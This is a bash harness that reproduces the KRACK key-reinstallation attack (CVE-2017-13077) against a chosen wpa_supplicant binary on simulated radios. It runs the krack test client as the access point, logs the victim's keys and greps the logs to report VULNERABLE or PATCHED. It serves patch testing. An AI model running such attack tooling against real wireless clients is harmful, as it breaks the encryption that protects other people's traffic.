#!/bin/bash
# run-attack.sh - pairwise four-way-handshake KRACK test (CVE-2017-13077).
# Usage: run-attack.sh <client-wpa_supplicant-binary> <out-prefix>
# Writes <out-prefix>.ap.log (access point) and <out-prefix>.cl.log (victim).
# Env: KDIR, CONF, DUR, MODE (see README.md / REPRODUCE.md).

set -u

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

CLIENT_BIN="${1:?usage: run-attack.sh <client-wpa_supplicant-binary> <out-prefix>}"
OUT="${2:?usage: run-attack.sh <client-wpa_supplicant-binary> <out-prefix>}"

KDIR="${KDIR:-$SCRIPT_DIR/../krackattacks-scripts/krackattack}"
CONF="${CONF:-$SCRIPT_DIR/../config/client.conf}"
DUR="${DUR:-45}"
MODE="${MODE:-}"
IFACE_CL=wlan1

case "$OUT" in /*) : ;; *) OUT="$(pwd)/$OUT" ;; esac
APLOG="${OUT}.ap.log"
CLLOG="${OUT}.cl.log"

cleanup() {
  sudo pkill -f krack-test-client 2>/dev/null
  sudo pkill -x hostapd 2>/dev/null
  sudo pkill -f "wpa_supplicant .*$IFACE_CL" 2>/dev/null
  sudo pkill -f "dhclient" 2>/dev/null
  sudo pkill -f "ping -I $IFACE_CL" 2>/dev/null
  sudo rm -f "/run/wpa_supplicant/$IFACE_CL" 2>/dev/null
  sleep 1
}

echo "### CLIENT=$CLIENT_BIN OUT=$OUT MODE='${MODE:-pairwise(default)}' DUR=${DUR}s"
[ -x "$CLIENT_BIN" ] || { echo "!! client binary not executable: $CLIENT_BIN"; exit 2; }
[ -f "$CONF" ]       || { echo "!! client config not found: $CONF"; exit 2; }
[ -d "$KDIR" ]       || { echo "!! krackattack dir not found: $KDIR"; exit 2; }

cleanup

# Fresh virtual radios so each run starts identically.
sudo modprobe -r mac80211_hwsim 2>/dev/null; sleep 1
sudo modprobe mac80211_hwsim radios=2;        sleep 2
sudo rfkill unblock all 2>/dev/null

cd "$KDIR" || exit 2
sudo ./venv/bin/python ./krack-test-client.py $MODE > "$APLOG" 2>&1 &

# AP-ENABLED is the reliable "access point up" marker in the log.
for _ in $(seq 1 40); do
  grep -q "AP-ENABLED" "$APLOG" && break
  sleep 0.5
done
if ! grep -q "AP-ENABLED" "$APLOG"; then
  echo "!! access point never enabled"; tail -5 "$APLOG"; cleanup; exit 1
fi
sleep 2
echo "-- access point up, starting victim client"

# Victim with full debug (-dd) and key logging (-K): this log is the evidence.
sudo "$CLIENT_BIN" -dd -K -D nl80211 -i "$IFACE_CL" -c "$CONF" > "$CLLOG" 2>&1 &
sleep 6

# Address the client and make it transmit so it uses the installed key.
sudo timeout 10 dhclient -v "$IFACE_CL" >/dev/null 2>&1 &
sleep 3
sudo ip addr add 192.168.100.2/24 dev "$IFACE_CL" 2>/dev/null
sudo ping -I "$IFACE_CL" -c "$DUR" -i 1 192.168.100.254 >/dev/null 2>&1 &

echo "-- attack running for ${DUR}s (access point retransmits Message 3)"
sleep "$DUR"

cleanup

inst=$(grep -c 'Installing PTK to the driver' "$CLLOG")
guard=$(grep -c 'Do not re-install same PTK'  "$CLLOG")
done4=$(grep -c 'Key negotiation completed'    "$CLLOG")

echo "== RESULTS for $OUT =="
echo "  install=$inst  guard=$guard  completed=$done4"
echo "  install>1, guard=0 => VULNERABLE; install=1, guard>0 => PATCHED."
echo "  Logs: $CLLOG (victim, authoritative), $APLOG (access point)."
